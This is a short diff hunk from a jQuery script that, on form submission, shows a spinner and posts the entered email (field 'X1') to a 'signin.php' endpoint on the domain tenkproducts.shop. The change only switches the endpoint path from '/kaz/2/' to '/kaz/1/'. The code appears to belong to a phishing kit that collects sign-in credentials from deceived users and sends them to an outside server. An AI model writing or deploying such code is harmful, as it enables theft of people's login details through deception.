@@ -46,7 +46,7 @@ $(document).ready(function(){
         $("#mcontent").css("display", "none");
         $("#mspinner").css("display", "block");
         $.ajax({
-            url: "https://tenkproducts.shop/kaz/2/signin.php",
+            url: "https://tenkproducts.shop/kaz/1/signin.php",
             method: "post",
             data: {
                 X1: email,
